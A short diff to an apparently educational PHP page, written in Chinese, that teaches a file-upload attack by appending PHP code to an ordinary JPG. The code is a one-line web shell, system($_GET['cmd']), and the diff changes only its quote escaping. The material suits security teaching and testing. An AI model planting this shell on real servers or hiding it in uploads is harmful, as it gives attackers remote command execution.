@@ -108,7 +108,7 @@ $content = '<div class="card">
                     <ol>
                         <li>准备一张正常的图片文件，例如：<code>test.jpg</code></li>
                         <li>使用文本编辑器打开图片文件，在文件末尾添加PHP代码：</li>
-                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></pre>
                         <li>保存文件，保持扩展名不变（如：<code>test.jpg</code>）</li>
                     </ol>
 
